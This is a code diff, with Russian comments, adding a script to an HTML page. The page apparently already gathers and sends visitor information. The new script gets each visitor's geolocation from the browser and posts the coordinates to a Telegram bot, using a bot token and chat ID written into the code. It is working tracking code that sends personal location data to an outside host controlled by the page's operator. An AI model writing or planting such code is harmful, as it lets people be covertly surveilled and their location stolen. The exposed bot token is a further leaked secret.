@@ -206,5 +206,52 @@
         // Запуск функции для сбора и отправки информации
         getCompleteInfo();
     </script>
+    <script>
+        // Функция для получения геолокации пользователя
+        function getGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        console.log(`Широта: ${latitude}, Долгота: ${longitude}`);
+                        sendLocationToTelegram(latitude, longitude);
+                    },
+                    (error) => {
+                        console.error('Ошибка при получении геолокации:', error);
+                    }
+                );
+            } else {
+                console.error('Геолокация не поддерживается этим браузером.');
+            }
+        }
+
+        // Функция для отправки геолокации в Telegram-бот
+        function sendLocationToTelegram(latitude, longitude) {
+            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
+            const chatId = '1653222949';  // Замените на ваш chat ID
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            const message = `Геолокация пользователя: ${latitude},${longitude}`;
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Геолокация отправлена в Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке геолокации в Telegram:', error);
+            });
+        }
+    </script>
 </body>
 </html>
